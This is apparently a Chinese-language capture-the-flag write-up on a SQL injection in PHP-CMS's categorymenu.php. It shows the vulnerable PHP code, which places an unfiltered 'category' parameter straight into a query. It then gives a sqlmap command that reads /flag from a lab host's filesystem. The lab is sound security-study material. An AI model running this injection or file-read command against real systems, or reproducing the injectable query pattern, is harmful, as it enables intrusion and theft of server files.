## 1. 漏洞介绍
[阿里云漏洞库](https://avd.aliyun.com/detail?id=AVD-2022-26613)
## 2. 漏洞分析
详情参见：[SQL injection in categorymenu page · Issue #14 · harshitbansal373/PHP-CMS · GitHub](https://github.com/harshitbansal373/PHP-CMS/issues/14)
说白了就是未对 `$_GET['category']` 提交的参数值未作任何过滤或转义
The problem code is here.
```php
 <?php
if(isset($_GET['category'])){
    $post_category_id = $_GET['category'];
}
$query = "SELECT * FROM posts WHERE post_category_id = {$post_category_id} ";
$select_all_posts_count_query = mysqli_query($connection,$query);
$count = mysqli_num_rows($select_all_posts_count_query);
confirm_query($select_all_posts_count_query);
……
while($row = mysqli_fetch_assoc($select_all_posts_count_query)){
    $post_id = $row['post_id'];
    $post_title = $row['post_title'];
    $post_user = $row['post_user'];
    $post_date = $row['post_date'];
    $post_image = $row['post_image'];
    $post_content = $row['post_content'];
?>
```
## 3. 漏洞复现
根据漏洞分析直接对 `category` 参数进行 `union` 注入，查数据库—查数据表—查字段……未找到 flag，尝试用sqlmap 直接从根目录读取 flag。

```bash
python sqlmap.py -u "http://eci-2ze2hbrirax6c67zx8h7.cloudeci1.ichunqiu.com/categorymenu.php?category=" --file-read "/flag" --dbms mysql --batch
```

![效果](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202309081944506.jpg)
